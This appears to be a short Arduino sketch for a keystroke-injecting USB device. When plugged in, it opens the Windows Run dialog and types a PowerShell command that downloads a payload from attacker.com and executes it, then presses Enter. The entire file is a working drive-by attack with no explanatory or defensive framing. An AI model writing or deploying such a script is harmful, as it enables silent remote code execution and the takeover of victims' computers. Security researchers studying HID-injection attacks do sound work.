#include "Keyboard.h"

void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);

  Keyboard.begin();
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);

  Keyboard.releaseAll();

  Keyboard.print("powershell iex(iwr attacker.com/payload -UseBasicParsing).content");

  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  digitalWrite(LED_BUILTIN, HIGH);
}

void loop() {  }
